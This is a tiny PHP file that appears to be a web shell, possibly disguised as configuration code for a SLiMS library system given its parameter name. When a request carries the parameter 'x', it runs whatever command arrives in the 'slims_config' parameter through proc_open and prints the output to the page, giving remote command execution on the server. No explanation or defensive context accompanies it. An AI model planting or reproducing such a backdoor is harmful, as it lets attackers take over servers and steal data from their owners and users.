<?php
if (isset($_GET['x'])) {
  $a = $_GET['slims_config'];
  $descriptors = [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']];
  $handle = proc_open($a, $descriptors, $pipes, null, ['USER' => 'guest']);
  $world = stream_get_contents($pipes[1]);
  print_r("<pre>" . $world);
  die;
}